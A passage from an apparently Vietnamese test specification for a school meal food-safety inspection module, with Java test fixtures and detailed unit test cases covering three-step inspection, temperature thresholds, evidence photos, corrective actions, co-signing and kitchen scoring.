    public static InspectionSession newSession(Consumer<InspectionSession>... overrides) {
        InspectionSession s = new InspectionSession();
        s.setCode("INSP-TEST-" + java.util.UUID.randomUUID().toString().substring(0, 6));
        s.setSchoolId(SCHOOL_ID);
        s.setPartnerId(PARTNER_A);
        s.setDate(LocalDate.now());
        s.setMeal(MealType.LUNCH);                  // D6: SCREAMING_SNAKE, không phải "Bữa trưa"
        s.setStep1(StepStatus.PENDING);
        s.setStep2(StepStatus.PENDING);
        s.setStep3(StepStatus.PENDING);
        s.setOverall(OverallStatus.IN_PROGRESS);    // CF-23: giá trị thứ 4
        s.setInspector(INSPECTOR);
        s.setDish("Gà rang gừng");
        s.setMenuId("MENU-2026-30");                // BR-093: hồ sơ hoàn chỉnh
        s.setCoSignedAt(null);                      // L15: chưa đồng ký
        for (Consumer<InspectionSession> o : overrides) o.accept(s);
        return s;
    }

    /** Phiên đã ĐẠT hoàn chỉnh — FX-001. */
    public static InspectionSession newPassedSession() {
        return newSession(s -> {
            s.setStep1(StepStatus.PASSED);
            s.setStep2(StepStatus.PASSED);
            s.setStep3(StepStatus.PASSED);
            s.setOverall(OverallStatus.PASSED);
            s.setCoreTemp(82);
            s.setCoSigner("Ngô Thị Hà (Y tế)");
            s.setCoSignedAt(java.time.Instant.now());
            s.setDecidedAt(java.time.Instant.now());   // ADR-M07-02
        });
    }

    /** Phiên TRƯỢT Bước 2 vì nhiệt độ lõi — FX-002. */
    public static InspectionSession newFailedAtStep2() {
        return newSession(s -> {
            s.setStep1(StepStatus.PASSED);
            s.setStep2(StepStatus.FAILED);
            s.setOverall(OverallStatus.FAILED);
            s.setCoreTemp(68);                          // < 75 → BR-090
            s.setDish("Cá basa sốt cà chua");
        });
    }

    /** Baseline = FX-009 (điểm bếp 55, dưới ngưỡng 60). */
    public static KitchenInspection newKitchenInspection(Consumer<KitchenInspection>... o) {
        KitchenInspection k = new KitchenInspection();
        k.setCode("KIN-TEST-" + java.util.UUID.randomUUID().toString().substring(0, 6));
        k.setSchoolId(SCHOOL_ID);
        k.setDate(LocalDate.now());
        k.setInspector("Ngô Thị Hà");
        k.setPestControlValid(true);                     // L9: giữ cột, không có endpoint riêng
        k.setStaffHealthValid(false);                    // BR-103
        for (Consumer<KitchenInspection> c : o) c.accept(k);
        return k;                                       // score/result do service TÍNH, không set tay (C11)
    }
}
```

**Kiểm tự động chống shared state** (CI, §6):

```bash
grep -rnE "^\s*(private )?static\s+(final\s+)?(InspectionSession|KitchenInspection|ViolationRecord|ChecklistGroup)\s+" \
     src/test/java/com/sfms/mf07/ | grep -v InspectionTestFixtures.java
# Expected: no output
```

---

### 4.1. UNIT TEST CASES

> Layer `com.sfms.mf07.service`. Repository + `InventoryQueryPort` + `ObjectStoragePort` + `GeoLocationPort` = **Mockito mock**. Không chạm DB.

---

#### MF07-TC-001 — Ba bước đúng thứ tự → overall PASSED sau đồng ký

**Severity:** `CRITICAL`
**Legal:** **QĐ 1246/QĐ-BYT Điều 3–5** (Mẫu 1/2/3) · Luật ATTP 55/2010/QH12
**Feature Under Test:** `InspectionSessionService.submitStep()` × 3 → `ServingApprovalService.approve()`
**Test File:** `service/ThreeStepFlowTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-01`, `COND-08`
**Constraint Ref:** `TDS §17.1 C1`
**Oracle Source:** **BR-079** (*"Mỗi lô thức ăn phải qua **đúng 3 bước** theo Điều 3–5 QĐ 1246"*) + **BR-098** (*"Chỉ khi **cả 3 bước ĐẠT** hệ thống mới **phê duyệt bữa ăn** để phục vụ"*) + **BR-099**/QĐ 1246 Điều 5 (đồng ký sau khi hoàn tất) + **MSG-043** = `"Food safety inspection checklist submitted successfully."` *(nguyên văn `error_message.md`)*
**Kỹ thuật:** State Transition Testing (đường hợp lệ) + Use Case Testing

**Preconditions:**
- `FX-003` phiên `IN_PROGRESS`, 3 bước `PENDING`
- `FX-020` JWT Caterer `SUP-001` (chủ sở hữu phiên)
- `FX-030` menu + dishId hợp lệ (BR-093)
- Mọi dòng biểu mẫu hợp lệ, có ảnh cho dòng "Không đạt" (không có dòng nào không đạt)

**Test Steps:**
1. `submitStep(code, 1, step1Payload)` → assert.
2. `submitStep(code, 2, step2Payload{coreTemp:82})` → assert.
3. `submitStep(code, 3, step3Payload)` → assert.
4. `approve(code, coSigner)` (đồng ký).

**Expected Result (PASS):**
- Sau bước 1: `step1=PASSED`, `overall` **vẫn** `IN_PROGRESS` (CF-23 — không nhảy sang PASSED sớm)
- Sau bước 2: `step2=PASSED`, `overall=IN_PROGRESS`
- Sau bước 3: `step3=PASSED`, `overall` **vẫn** `IN_PROGRESS` — **chưa** PASSED vì **chưa đồng ký**
- Sau đồng ký: `overall=PASSED`, `co_signed_at` khác `null`, `decided_at` khác `null` (ADR-M07-02)
- Message = **MSG-043**

**Expected Result (FAIL):**
- `overall=PASSED` ngay sau bước 3 mà chưa đồng ký ⇒ vi phạm BR-098 + QĐ 1246 Điều 5; hồ sơ không có chữ ký 2 bên là **hồ sơ vô hiệu khi thanh tra**
- `decided_at` null ⇒ mất mốc thời gian quyết định pháp lý

**Current Status:** 🔴 Not written
**Implementation Note:** `overall` là **cột lưu** (ADR-M07-02), tính **một lần** lúc chốt phiên — không tính lại mỗi lần đọc. Test `MF07-TC-INT-019` kiểm nhất quán giữa `overall` và 3 cột bước.

---

#### MF07-TC-002 — Nộp Bước 3 khi Bước 2 chưa PASSED → INSP-079

**Severity:** `CRITICAL`
**Legal:** QĐ 1246 Điều 4 (Bước 2 kiểm **trong suốt** quá trình chế biến — không thể bỏ qua)
**Feature Under Test:** `ThreeStepValidator.assertStepOrder()`
**Test File:** `service/ThreeStepFlowTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-01`
**Constraint Ref:** `TDS §17.1 C1`
**Oracle Source:** **BR-079** + `TDS` §10 → `INSP-079`, HTTP **409**, message *"Bước 3 bị khóa cho tới khi Bước 2 được đánh dấu ĐẠT (BR-079)."* + `TDS` §13 hàng `UT-07-02`
**Kỹ thuật:** State Transition Testing (transition **không** hợp lệ)

**Preconditions:** `FX-003` — `step1=PASSED`, `step2=PENDING`.

**Test Steps:**
1. `@ParameterizedTest` với `step2 ∈ {PENDING, FAILED}`.
2. `submitStep(code, 3, payload)`.

**Expected Result (PASS):**
- Cả 2 trường hợp: `IllegalStepOrderException`, `$.error.code == "INSP-079"`, HTTP **409**
- `step3` giữ `PENDING`; `step3_rows` **không** có dòng nào được ghi
- Ngược lại `step2=PASSED` → nộp Bước 3 thành công
- Nộp Bước 2 khi `step1=PENDING` → **cũng** 409 (cùng luật thứ tự)

**Expected Result (FAIL):**
- Nộp được ⇒ hồ sơ có Bước 3 mà không có Bước 2 ĐẠT ⇒ **hồ sơ thiếu mẫu biểu theo QĐ 1246**, và bữa ăn có thể được phê duyệt dựa trên hồ sơ khuyết

**Current Status:** 🔴 Not written

---

#### MF07-TC-003 — Nhiệt độ lõi 68°C → INSP-017, step2 FAILED

**Severity:** `CRITICAL`
**Feature Under Test:** `Step2Validator`
**Test File:** `service/Step2ValidatorTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-02`
**Constraint Ref:** `TDS §17.1 C2`
**Oracle Source:** **BR-090** (*"Thức ăn sau nấu đạt **nhiệt độ lõi ≥ 75°C**"* — ngưỡng HACCP, TDS ghi rõ **không** trích trực tiếp QĐ 1246) + **MSG-017** nguyên văn = `"Cooking temperature too low: Meal core temperature must reach 75°C."` + `TDS` §10 → `INSP-017`, HTTP **422** + fixture thật `FX-002` (`coreTemp=68`)
**Kỹ thuật:** Boundary Value Analysis (off-point dưới)

**Preconditions:** `FX-002` payload Bước 2 với `coreTemp = 68`.

**Test Steps:**
1. `submitStep(code, 2, {coreTemp: 68, ...})`.
2. Assert exception + trạng thái + event.

**Expected Result (PASS):**
- `LowCoreTempException`, `$.error.code == "INSP-017"`, `$.error.message` = MSG-017 nguyên văn, HTTP **422**
- `step2 = FAILED` (**được ghi lại**, không phải rollback trắng — BR-095 cần bản ghi non-conformance)
- `overall = FAILED`
- Phát event `InspectionStepFailed` (→ `MF07-TC-008`)
- ⚠️ Phân biệt quan trọng: **422 nhưng VẪN ghi `FAILED`**. Đây không phải validation thuần "từ chối request" — luật nghiệp vụ đòi **lưu vết bước trượt**.

**Expected Result (FAIL):**
- Trả 422 mà **không** ghi `step2=FAILED` ⇒ không có non-conformance record ⇒ BR-095 không có gì để tạo CAPA, và `serving-gate` không biết phiên đã trượt ⇒ **bữa ăn 68°C được phát**
- `overall` vẫn `IN_PROGRESS` ⇒ gate BR-094 hiểu sai là "đang kiểm", cho phát suất

**Current Status:** 🔴 Not written
**Implementation Note:** ghi `FAILED` + phát event **trong cùng transaction**, rồi mới ném exception ở tầng ngoài (hoặc trả 422 kèm body có `stepStatus: "FAILED"`). Đừng dùng `@Transactional` rollback-on-exception mặc định cho nhánh này.

---

#### MF07-TC-004 — Nhiệt độ lõi đúng 75°C PHẢI PASSED (biên `>=`)

**Severity:** `CRITICAL`
**Feature Under Test:** `Step2Validator`
**Test File:** `service/Step2ValidatorTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-02`
**Constraint Ref:** `TDS §17.1 C2` (*"Dùng `>=`, không phải `>`"*)
**Oracle Source:** **BR-090** — *"đạt nhiệt độ lõi **≥ 75°C**"* ⇒ **75 là ĐẠT** + `TDS` §13 hàng `UT-07-04` (*"biên `>=`, không phải `>`"*)
**Kỹ thuật:** Boundary Value Analysis (**on-point**)

**Test Steps:** `@ParameterizedTest @ValueSource(ints = {74, 75, 76})` → `submitStep(code, 2, {coreTemp})`.

**Expected Result (PASS):**
- `74` → `FAILED` + `INSP-017`
- **`75` → `PASSED`** (không exception)
- `76` → `PASSED`
- CHECK constraint DB cũng dùng `>=` — kiểm ở `MF07-TC-INT-012`

**Expected Result (FAIL):**
- `75` bị chặn ⇒ dùng `>` thay `>=` ⇒ **chặn oan bữa ăn đạt đúng chuẩn**; bếp phải nấu quá nhiệt để lách, làm giảm chất lượng và gây mất tin tưởng vào hệ thống

**Current Status:** 🔴 Not written
**Implementation Note:** đặt ngưỡng thành hằng `MIN_CORE_TEMP_C = 75` ở **một chỗ** (dùng chung service + CHECK constraint sinh từ cùng giá trị), tránh hai nơi lệch nhau.

---

#### MF07-TC-005 — Nhiệt độ giữ ấm 58°C → INSP-091, step3 FAILED

**Severity:** `HIGH`
**Feature Under Test:** `Step3Validator`
**Test File:** `service/Step3ValidatorTest.java`
**TDD Phase:** 🔴 RED · **`@Disabled("Chờ CF-24/L19 — Minh bổ sung ô nhập holdingTemp ở Bước 3")`**
**Condition Ref:** `COND-03`
**Constraint Ref:** `TDS §17.1 C2`
**Oracle Source:** **BR-091** (*"Thức ăn chờ phục vụ giữ **≥ 60°C**"*) + `TDS` §10 → `INSP-091`, HTTP **422**, **không có MSG riêng** (không mượn MSG-020 — xem L19) + `TDS` §13 hàng `UT-07-05`
**⚠️ Logic Issue:** **L19/CF-24** — `Step3Row` của mock **không có** field `holdingTemp` ⇒ BR-091 hiện **không có nguồn dữ liệu**. TC viết sẵn nhưng `@Disabled`; CHECK `ck_insp_holding_temp` **chỉ enable sau khi** FE có ô nhập (bật ngay sẽ chặn **mọi** phiên hợp lệ).
**Kỹ thuật:** Boundary Value Analysis

**Test Steps:** `@ValueSource(ints = {59, 60, 61})` → `submitStep(code, 3, {holdingTemp})`.

**Expected Result (PASS):**
- `59` → `step3=FAILED` + `INSP-091`
- **`60` → PASSED** (biên `>=`)
- `61` → PASSED
- Khi `holdingTemp` **vắng** (trạng thái hiện tại của mock): **không** chặn, ghi warning `"BR-091 không kiểm được — thiếu holdingTemp (CF-24)"` để có vết

**Expected Result (FAIL):**
- Chặn khi `holdingTemp` vắng ⇒ **toàn bộ phiên kiểm thực của FE hiện tại bị chặn** — đúng hậu quả mà L19 cảnh báo
- `60` bị chặn ⇒ off-by-one như TC-004

**Current Status:** 🔴 Not written (disabled)
**Implementation Note:** khi Minh bổ sung ô nhập: bỏ `@Disabled`, **đồng thời** enable CHECK constraint trong migration mới (không sửa `V12` đã chạy).

---

#### MF07-TC-006 — Lô nguyên liệu hết hạn ở Bước 1 → INSP-092

**Severity:** `CRITICAL`
**Feature Under Test:** `Step1Validator` + `InventoryQueryPort` (MF06)
**Test File:** `service/Step1ValidatorTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-04`
**Constraint Ref:** `TDS §17.1 C2`
**Oracle Source:** **BR-092** (*"Hệ thống **tự động** kiểm tra hạn sử dụng lô nguyên liệu dùng trong bước kiểm tra"*) + `TDS` §10 → `INSP-092`, HTTP **422**, message chứa `[Batch ID]` + `TDS` §13 hàng `UT-07-06`
**Kỹ thuật:** Boundary Value Analysis (`expiryDate` = date−1 / = date / = date+1) + Equivalence Partitioning

**Preconditions:** `FX-008` — stub `InventoryQueryPort` trả lô `BATCH-MP-8820` với `expiryDate` thay đổi theo tham số.

**Test Steps:** `@ParameterizedTest` với `expiryDate ∈ {session.date − 1, session.date, session.date + 1}`.

**Expected Result (PASS):**
- `date − 1` (đã hết hạn) → `ExpiredBatchException`, `INSP-092`, HTTP **422**, message có đúng `BATCH-MP-8820`
- `date` (hết hạn **đúng ngày**) → **ĐẠT** (còn dùng được trong ngày HSD — đây là quy ước cần Huy xác nhận, ghi rõ trong TC)
- `date + 1` → ĐẠT
- Kiểm **tự động**: test **không** truyền cờ nào từ client; chỉ truyền `batchIds` và backend tự tra (BR-092 nói *"hệ thống tự động"*)
- `step1 = FAILED` được ghi lại (cùng lý do TC-003)

**Expected Result (FAIL):**
- Không tự tra HSD, chỉ tin cờ client gửi ⇒ vi phạm BR-092; nguyên liệu quá hạn vào bữa ăn học sinh
- Chặn ở `date` mà chưa hỏi Huy ⇒ chặn oan lô còn hạn trong ngày

**Current Status:** 🔴 Not written
**Implementation Note:** ⚠️ ranh giới "hết hạn đúng ngày" **chưa có** trong BR-092. TC ghi rõ giả định `expiryDate >= session.date` là còn hạn; **cần Huy xác nhận** trước khi implement. Nếu Huy chốt khác, sửa TC trước rồi sửa code.

---

#### MF07-TC-007 — Dòng "Không đạt" thiếu ảnh bằng chứng → INSP-083

**Severity:** `HIGH`
**Feature Under Test:** `EvidenceValidator` + CHECK `ck_s1f_evidence`
**Test File:** `service/EvidenceValidatorTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-05`
**Constraint Ref:** `TDS §17.1 C5`
**Oracle Source:** **BR-083** (*"Mỗi bước phải kèm **ảnh bằng chứng, vị trí GPS, timestamp** ghi tự động"*) + `TDS` §10 → `INSP-083`, HTTP **422** + `TDS` §13 hàng `UT-07-07` (*"vi phạm CHECK `ck_s1f_evidence`"*) + **L20/CF-25** (4 cột `fail_*`)
**Kỹ thuật:** Equivalence Partitioning + Constraint-based

**Preconditions:** `FX-007` — dòng `sensoryPass=false`, `photoCount=0`.

**Test Steps:**
1. Nộp Bước 1 với 1 dòng "Không đạt" **không** ảnh.
2. Nộp lại **có** ảnh + `failReason`.
3. Kiểm 4 cột `fail_*` (L20).

**Expected Result (PASS):**
- (1) → `MissingEvidenceException`, `INSP-083`, HTTP **422**; message chỉ **đúng dòng** thiếu ảnh
- (2) → ĐẠT; `inspection_evidences` có bản ghi với `url` + **`sha256`** (ADR-M07-04), **không** lưu blob
- Dòng **"Đạt"** không ảnh → **không** chặn (chỉ dòng "Không đạt" bắt buộc ảnh)
- 4 cột `fail_step`, `fail_reason`, `fail_severity`, `fail_witness` **được lưu** (L20) — không bị vứt như FE hiện tại
- GPS + timestamp được ghi **server-side** (`GeoLocationPort` fake no-op ở dev — `FX-026`); assert **có** giá trị, không assert độ chính xác

**Expected Result (FAIL):**
- Nộp được không ảnh ⇒ biên bản kiểm thực không có bằng chứng ⇒ vô giá trị khi tranh chấp với đơn vị suất ăn
- Tin GPS/timestamp do client gửi ⇒ có thể giả mạo vị trí/thời điểm kiểm tra (C5 nói rõ *"không tin client"*)
- 4 cột `fail_*` null ⇒ không đủ dữ liệu nâng phiên trượt thành biên bản vi phạm (BR-183)

**Current Status:** 🔴 Not written
**Implementation Note:** ⚠️ `fail_severity`/`fail_witness` **chờ Huy xác nhận** là field chính thức (L20). Nếu Huy nói UI tạm → tách phần assert đó sang TC riêng `@Disabled`, giữ phần ảnh/lý do.

---

#### MF07-TC-008 — Bước trượt → BACKEND tự tạo CAPA trong cùng transaction

**Severity:** `CRITICAL`
**Feature Under Test:** `InspectionSessionService.submitStep()` → event `InspectionStepFailed` → `CorrectiveActionPort`
**Test File:** `service/InspectionCapaTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-06`
**Constraint Ref:** `TDS §17.1 C3, C13`
**Oracle Source:** **BR-095** (*"Bước thất bại → ghi **chi tiết không tuân thủ** + **tự động tạo Corrective Action Request**"*) + **BR-097** (*"Kết quả thất bại **nghiêm trọng** liên kết tự động với **quản lý sự cố**"*) + `TDS` §7.1 (event catalog) + `TDS` §13 hàng `UT-07-08` + **L12/CF-14**
**⚠️ Logic Issue:** **L12/CF-14** — hiện **FE gọi tay** `POST /corrective-actions` sau khi ghi bước trượt (2 call-site). Đóng tab trước request thứ 2 ⇒ **không CAPA nào được tạo**, BR-095 mất hiệu lực **im lặng**.
**Kỹ thuật:** Error Guessing (mô phỏng client bỏ giữa) + Use Case Testing

**Test Steps:**
1. `submitStep(code, 2, {coreTemp: 68})` — **không** gọi bất kỳ API CAPA nào từ phía test.
2. Verify port CAPA được gọi.
3. Mô phỏng FE **cũng** gọi `POST /corrective-actions` cho cùng phiên+bước.
4. `severity = HIGH` → kiểm event thứ hai.

**Expected Result (PASS):**
- (2) `verify(correctiveActionPort).create(argThat(r -> r.sourceInspectionCode().equals(code) && r.step() == 2))` — **backend tự tạo**, không cần client
- CAPA được tạo trong **cùng transaction** với bản ghi `step2=FAILED`: nếu ghi bước rollback thì CAPA cũng rollback (test bằng cách ném lỗi giả sau khi ghi bước)
- (3) **Không tạo trùng** — idempotency theo `(sourceInspectionCode, step)`; lần gọi thứ hai trả về CAPA đã có, không tạo bản ghi thứ 2
- (4) `severity = HIGH` → phát **thêm** `CriticalInspectionFailure` (BR-097); `severity = LOW/MEDIUM` → **không** phát event này
- Warning **MSG-056** = `"Re-inspection required: Failed safety check during inspection step [Step Name]."` với `[Step Name]` = tên Bước 2

**Expected Result (FAIL):**
- Không tạo CAPA ⇒ BR-095 mất hiệu lực; bước trượt không ai theo dõi khắc phục — đúng lỗ hổng L12 đang tồn tại
- Tạo **2** CAPA khi FE cũng gọi ⇒ nhân đôi công việc cho MF11, sai số liệu báo cáo tuân thủ
- CAPA tạo **ngoài** transaction ⇒ ghi bước lỗi mà CAPA vẫn tồn tại (CAPA mồ côi)

**Current Status:** 🔴 Not written
**Implementation Note:** **Minh phải gỡ** 2 lệnh gọi client khi chuyển sang backend thật, nếu không sẽ tạo trùng (idempotency là lớp phòng vệ, không phải giải pháp chính). Ưu tiên cao — §9.5 mục 2 của TDS.

---

#### MF07-TC-009 — Tái kiểm tra tạo phiên MỚI, phiên cũ không đổi

**Severity:** `HIGH`
**Legal:** §4.2 TDS + Luật ATTP (hồ sơ đã chốt là bất biến)
**Feature Under Test:** `InspectionSessionService.reinspect()`
**Test File:** `service/ReinspectionTest.java`
**TDD Phase:** 🔴 RED · ⚠️ endpoint **MỚI** (L16/CF-19 — FE chưa có nút)
**Condition Ref:** `COND-07`
**Constraint Ref:** `TDS §17.1 C3`
**Oracle Source:** **BR-096** (*"Sau hành động khắc phục, bước thất bại phải **tái kiểm tra**"*) + **MSG-056** + `TDS` §4.2 (hồ sơ bất biến) + `TDS` §13 hàng `UT-07-09` (*"phiên mới, phiên cũ **không đổi**"*)
**Kỹ thuật:** State Transition Testing

**Preconditions:** `FX-002` phiên `overall=FAILED`.

**Test Steps:**
1. Snapshot **toàn bộ** hàng phiên cũ + các bảng dòng.
2. `reinspect(oldCode, actor)`.
3. So snapshot; kiểm phiên mới.

**Expected Result (PASS):**
- Trả về phiên **MỚI** với `code` khác, `overall=IN_PROGRESS`, 3 bước `PENDING`
- Phiên mới có `reinspects_code = <code phiên cũ>` (liên kết ngược)
- Phiên mới **kế thừa** `date`, `meal`, `dish`, `menuId`, `partnerId` từ phiên cũ (cùng bữa)
- **Phiên cũ giống hệt snapshot** — kể cả `updated_at`, `overall` vẫn `FAILED`, các dòng biểu mẫu không đổi
- Warning MSG-056

**Expected Result (FAIL):**
- Reset phiên cũ về `PENDING` ⇒ **xoá bằng chứng bước trượt**; thanh tra không thấy được đã từng có vi phạm và đã khắc phục — vi phạm §4.2 và làm CAPA của MF11 trỏ vào phiên "sạch"
- Phiên mới không có liên kết ngược ⇒ không chứng minh được đã tái kiểm cho vi phạm nào

**Current Status:** 🔴 Not written

---

#### MF07-TC-010 — Đồng ký khi còn bước chưa PASSED → INSP-098

**Severity:** `CRITICAL`
**Legal:** QĐ 1246 Điều 5
**Feature Under Test:** `ServingApprovalService.approve()` / `POST /inspections/{code}/co-sign`
**Test File:** `service/ServingApprovalTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-08`
**Constraint Ref:** `TDS §17.1 C1`
**Oracle Source:** **BR-098** (*"Chỉ khi cả 3 bước ĐẠT hệ thống mới phê duyệt bữa ăn"*) + `TDS` §10 → `INSP-098`, HTTP **409** + `TDS` §13 hàng `UT-07-10` + **L15/CF-18** (`coSigner` gán sẵn lúc tạo **không phải** bằng chứng ký)
**Kỹ thuật:** Decision Table Testing (3 bước × trạng thái)

**Test Steps:** `@MethodSource` các tổ hợp trạng thái 3 bước:

| # | step1 | step2 | step3 | Expected |
|---|---|---|---|---|
| a | PASSED | PASSED | PASSED | **200**, `overall=PASSED` |
| b | PASSED | FAILED | PENDING | **409** `INSP-098` |
| c | PASSED | PASSED | PENDING | **409** `INSP-098` |
| d | PENDING | PENDING | PENDING | **409** `INSP-098` |
| e | PASSED | PASSED | FAILED | **409** `INSP-098` |

**Expected Result (PASS):**
- Đúng 5 hàng bảng trên
- Ở mọi ca 409: `overall` **không** đổi, `co_signed_at` vẫn `null`
- Ca (a): `co_signed_at` được set, `overall=PASSED`, `decided_at` set
- **L15:** phiên có `coSigner = "Ngô Thị Hà (Y tế)"` gán sẵn lúc tạo nhưng `co_signed_at = null` ⇒ `serving-gate` **vẫn chặn** (`MF07-TC-INT-003b`). Chuỗi nhãn không phải chữ ký.

**Expected Result (FAIL):**
- Đồng ký được khi còn bước trượt ⇒ **bữa ăn trượt kiểm thực được phê duyệt phục vụ** — ca nghiêm trọng nhất của module
- Coi `coSigner` gán sẵn là đã ký ⇒ mọi phiên tự động "đã đồng ký" ngay khi tạo, BR-098 vô hiệu

**Current Status:** 🔴 Not written

---

#### MF07-TC-011 — Điểm checklist tính SERVER-SIDE, bỏ qua score FE gửi

**Severity:** `HIGH`
**Feature Under Test:** `ChecklistScoringService.score()`
**Test File:** `service/ChecklistScoringServiceTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-10`
**Constraint Ref:** `TDS §17.1 C11`
**Oracle Source:** **BR-100** (*"Ghi nhận và theo dõi **điểm số vệ sinh hàng ngày**"*) + **BR-104** (*"Điểm vệ sinh… được tổng hợp và dùng trong **Báo cáo Tuân thủ ATTP**"*) + **L21/CF-26** (*"Backend **tính lại `score` từ `itemResults`**, bỏ qua giá trị FE gửi"*) + fixture `FX-013` (11/20 mục đạt → **55**)
**Kỹ thuật:** Error Guessing (client gửi số sai) + Contract Testing

**Preconditions:** `FX-012` checklist 20 mục; `FX-013` kết quả 11/20 đạt.

**Test Steps:**
1. `POST /kitchen-inspections` với `itemResults` 11/20 đạt **và** `score: 100` (sai lệch cố ý).
2. Đọc kết quả.
3. Biến thể: gửi **không** có `score`.
4. Biến thể: gửi `itemResults` rỗng.

**Expected Result (PASS):**
- `score == 55` (tính từ 11/20), **không** phải 100
- `result == FAILED` (55 < 60)
- Response **vẫn có** field `score` + `result` (FE đang đọc — C12)
- (3) → cũng ra 55; `score` không phải field bắt buộc trong request
- (4) → **422** (không thể chấm điểm phiên không có mục nào)
- Điểm được lưu vào DB đúng 55 để `ComplianceReportService` (BR-104) dùng

**Expected Result (FAIL):**
- Trả `score: 100` ⇒ **client tự chấm điểm bếp mình** ⇒ BR-100/104 vô hiệu, Báo cáo Tuân thủ ATTP (gửi cơ quan chức năng) dựa trên số do đơn vị bị kiểm tự khai
- Bỏ field `score` khỏi response ⇒ màn FE gãy

**Current Status:** 🔴 Not written
**Implementation Note:** công thức điểm lấy từ `checklist_items.weight` (nếu có) — nếu chưa có cột trọng số thì `score = round(passed / total × 100)`. Ghi rõ công thức đã dùng vào TDS §5.2 khi implement.

---

#### MF07-TC-012 — Điểm bếp 55 → FAILED + cảnh báo MSG-093

**Severity:** `HIGH`
**Feature Under Test:** `KitchenInspectionService.submit()`
**Test File:** `service/KitchenInspectionServiceTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-11`
**Constraint Ref:** `TDS §17.1 C6`
**Oracle Source:** `ADR-M07-03` (descope 05/07/2026) + `business_rules.md` §12 ghi chú sau BR-208 + `mock-server.ts` dòng 185–186 + **MSG-093** nguyên văn = `"Kitchen safety score below 60% threshold. Alert sent to School Administration — kitchen operations continue as normal."` + `TDS` §13 hàng `UT-07-12` + **L6/CF-2**
**⚠️ Logic Issue:** **L6/CF-2** — UC file UC-014 AF1 (khóa bếp + MSG-024) **đã descope**. §1.7 cho UC-014 chỉ có MSG-043, **không** có MSG-093 ⇒ MSG-093 **chưa vào traceability**, chờ Huy bổ sung.

**Preconditions:** `FX-009` `KIN-2026-016` score 55.

**Expected Result (PASS):**
- `result == FAILED`
- Warning **MSG-093** được phát (HTTP **200/201** kèm warning, **không** phải lỗi 4xx)
- Event `KitchenScoreBelowThreshold` phát tới School Administration
- **KHÔNG** dùng MSG-024, **KHÔNG** tạo bản ghi cách ly bếp, **KHÔNG** đổi trạng thái vận hành bếp nào

**Expected Result (FAIL):**
- Khóa bếp / chặn phân phát ⇒ **học sinh không có bữa ăn** vì một điểm checklist không có căn cứ pháp lý (ADR-M07-03 nêu đúng rủi ro này)
- Dùng MSG-024 ⇒ mượn cơ chế của Incident Management, sai module

**Current Status:** 🔴 Not written

---

#### MF07-TC-013 — Điểm bếp đúng 60 PHẢI PASSED (biên `>=`)

**Severity:** `MEDIUM`
**Feature Under Test:** `KitchenInspectionService.submit()`
**Test File:** `service/KitchenInspectionServiceTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-11`
**Constraint Ref:** `TDS §17.1 C6`
**Oracle Source:** `mock-server.ts` — `passed = score >= 60` (hằng trong mock, là oracle duy nhất vì **ngưỡng 60% chưa có căn cứ pháp lý** — TDS §10 ghi rõ MSG-093 *"không gắn BR"*) + `TDS` §13 hàng `UT-07-13`
**Kỹ thuật:** Boundary Value Analysis

**Test Steps:** `@ValueSource(ints = {59, 60, 61})`.

**Expected Result (PASS):** `59` → FAILED · **`60` → PASSED** · `61` → PASSED.
**Expected Result (FAIL):** `60` → FAILED ⇒ off-by-one, lệch mock, bếp bị đánh giá sai ở đúng mốc.

**Current Status:** 🔴 Not written
**Implementation Note:** ngưỡng 60 là **hằng cấu hình**, không hardcode — TDS ghi rõ chưa có căn cứ pháp lý nên có thể đổi.

---

#### MF07-TC-014 — Điểm bếp thấp KHÔNG được chặn serving-gate

**Severity:** `CRITICAL`
**Feature Under Test:** `ServingApprovalService` × `KitchenInspection`
**Test File:** `service/ServingGateDecisionTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-09`, `COND-11`
**Constraint Ref:** `TDS §17.1 C4, C6`
**Oracle Source:** `ADR-M07-03` (*"bếp vận hành bình thường"*) + **BR-094** (chỉ nói *"bất kỳ **bước** nào thất bại"* — tức 3 bước kiểm thực, **không** phải điểm bếp) + `TDS` §13 hàng `UT-07-14`
**Kỹ thuật:** Decision Table Testing

**Bảng quyết định (oracle: BR-094 + ADR-M07-03):**

| # | Có phiên kiểm thực? | `overall` | Điểm bếp | `allowed` | `reasonCode` |
|---|---|---|---|---|---|
| a | Có | `PASSED` | 92 | **true** | — |
| b | Có | `PASSED` | **40** | **true** ← ca then chốt | — |
| c | Có | `FAILED` | 92 | **false** | `INSPECTION_FAILED` |
| d | Có | `IN_PROGRESS` | 92 | **false** | `INSPECTION_INCOMPLETE` |
| e | **Không** | — | 92 | **false** | `NO_SESSION` |
| f | Có, `PASSED` nhưng `co_signed_at = null` | `PASSED` | 92 | **false** | `NOT_CO_SIGNED` (L15) |

**Expected Result (PASS):**
- Đúng 6 hàng; đặc biệt **(b)**: điểm bếp 40 mà kiểm thực ĐẠT ⇒ **vẫn cho phát suất**
- (e) khớp smoke test §11.3 của TDS: `{"allowed": false, "reasonCode": "NO_SESSION", ...}`

**Expected Result (FAIL):**
- (b) trả `false` ⇒ vô tình khôi phục hành vi **đã descope** (khóa bếp), học sinh không có bữa ăn
- (d) trả `true` ⇒ phát suất khi kiểm thực **chưa xong** — BR-094 chỉ cho phép khi ĐẠT, không phải "chưa trượt"

**Current Status:** 🔴 Not written
**Implementation Note:** `reasonCode` phải phân biệt `INSPECTION_FAILED` / `INSPECTION_INCOMPLETE` / `NO_SESSION` / `NOT_CO_SIGNED` — MF09 cần thông điệp khác nhau cho giáo viên.

---

#### MF07-TC-015 — Mục checklist "Không đạt" thiếu lý do → INSP-016

**Severity:** `HIGH`
**Feature Under Test:** `ChecklistScoringService` + CHECK `ck_cir_evidence`
**Test File:** `service/ChecklistScoringServiceTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `COND-05`
**Constraint Ref:** `TDS §17.1 C5`
